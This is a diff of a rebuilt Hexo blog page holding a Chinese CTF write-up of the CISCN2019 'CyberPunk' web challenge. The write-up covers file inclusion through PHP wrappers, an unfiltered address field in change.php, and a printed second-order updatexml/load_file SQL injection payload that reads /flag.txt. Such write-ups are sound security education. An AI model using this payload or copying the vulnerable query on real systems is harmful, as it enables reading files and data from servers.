@@ -8,8 +8,8 @@
     <meta name="description" content="前言关键字:[cyberpunk|2077]
 
 又是一道一年前做过的题，翻了翻当时的笔记，折腾了很久，没做出来。
-看了看wp，才知道flag在/flag.txt下面，之前一直在用错显爆数据库
-题解1.文件包含首先在注释里发现&amp;lt;!--?">
+看了看wp，才知道flag在&amp;#x2F;flag.txt下面，之前一直在用错显爆数据库
+题解1.文件包含首先在注释里发现&amp;lt">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -45,7 +45,7 @@
 
     <script src="./libs/jquery/jquery-3.6.0.min.js"></script>
 
-<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="./atom.xml" title="远离尘世的幻想乡" type="application/atom+xml">
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="./atom.xml" title="远离尘世的幻想乡" type="application/atom+xml">
 </head>
 
 
@@ -520,12 +520,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="./tags/CTF/">
-                                <span class="chip bg-color">CTF</span>
-                            </a>
-                        
                             <a href="./tags/Web/">
                                 <span class="chip bg-color">Web</span>
+                            </a>
+                        
+                            <a href="./tags/CTF/">
+                                <span class="chip bg-color">CTF</span>
                             </a>
                         
                             <a href="./tags/SQL%E6%B3%A8%E5%85%A5/">
@@ -571,7 +571,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    296
+                    299
                 </div>
                 
 
@@ -597,15 +597,15 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[cyberpunk|2077]</p>
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web5-CyberPunk/image-20210705163753559.png"></p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web5-CyberPunk/image-20210705163753559.png"></p>
 <p>又是一道一年前做过的题，翻了翻当时的笔记，折腾了很久，没做出来。</p>
-<p>看了看wp，才知道flag在/flag.txt下面，之前一直在用错显爆数据库</p>
+<p>看了看wp，才知道flag在&#x2F;flag.txt下面，之前一直在用错显爆数据库</p>
 <h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="1-文件包含"><a href="#1-文件包含" class="headerlink" title="1.文件包含"></a>1.文件包含</h3><p>首先在注释里发现<code>&lt;!--?file=?--&gt;</code>，文件包含下，加上伪协议，把几个文件源码爆出来，慢慢看。</p>
 <p>过滤的很死，但在change.php里没有对address进行正则检测，sql语句里还对<code>旧address</code>进行查询，所以漏洞就出在这。</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"update `user` set `address`='"</span> <span class="token operator">.</span> <span class="token variable">$address</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"', `old_address`='"</span> <span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'address'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"' where `user_id`="</span> <span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user_id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>逻辑梳理：address打入注入代码=&gt;第二次正常运行触发注入代码</p>
-<h3 id="2-SQL注入"><a href="#2-SQL注入" class="headerlink" title="2.SQL注入"></a>2.SQL注入</h3><p>因为有<code> print_r($db-&gt;error);</code>,所以错显读取flag，至于怎么知道flag在/flag.txt，暂时不明</p>
+<p>逻辑梳理：address打入注入代码&#x3D;&gt;第二次正常运行触发注入代码</p>
+<h3 id="2-SQL注入"><a href="#2-SQL注入" class="headerlink" title="2.SQL注入"></a>2.SQL注入</h3><p>因为有<code> print_r($db-&gt;error);</code>,所以错显读取flag，至于怎么知道flag在&#x2F;flag.txt，暂时不明</p>
 <p>payload：</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">&amp;</span>address<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and updatexml(1,concat(0x7e,(select substr(load_file('</span><span class="token operator">/</span>flag<span class="token punctuation">.</span>txt'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -676,12 +676,12 @@
                     
                         <div class="article-tag">
                             
-                                <a href="./tags/CTF/">
-                                    <span class="chip bg-color">CTF</span>
-                                </a>
-                            
                                 <a href="./tags/Web/">
                                     <span class="chip bg-color">Web</span>
+                                </a>
+                            
+                                <a href="./tags/CTF/">
+                                    <span class="chip bg-color">CTF</span>
                                 </a>
                             
                                 <a href="./tags/SQL%E6%B3%A8%E5%85%A5/">
@@ -1039,12 +1039,12 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="./tags/CTF/">
-                        <span class="chip bg-color">CTF</span>
-                    </a>
-                    
                     <a href="./tags/Web/">
                         <span class="chip bg-color">Web</span>
+                    </a>
+                    
+                    <a href="./tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
                     </a>
                     
                     <a href="./tags/SQL%E6%B3%A8%E5%85%A5/">
@@ -1100,12 +1100,12 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="./tags/CTF/">
-                        <span class="chip bg-color">CTF</span>
-                    </a>
-                    
                     <a href="./tags/Web/">
                         <span class="chip bg-color">Web</span>
+                    </a>
+                    
+                    <a href="./tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
                     </a>
                     
                     <a href="./tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
